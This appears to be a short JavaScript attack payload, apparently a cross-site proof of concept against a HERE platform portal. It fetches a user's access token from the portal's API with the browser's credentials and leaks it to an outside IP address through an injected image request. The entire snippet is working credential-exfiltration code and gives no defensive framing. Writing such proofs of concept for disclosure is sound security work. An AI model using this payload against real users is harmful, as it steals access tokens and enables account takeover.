var xhr = new XMLHttpRequest();   
xhr.open('GET', 'https://platform.here.com/api/portal/accessToken', true);
xhr.onload = function () {
var i = document.createElement('img');
i.src = 'http://34.245.80.122/olp.jpg?random='+JSON.parse(xhr.responseText).accessToken;
document.head.appendChild(i);
};
xhr.withCredentials = true;
xhr.send();
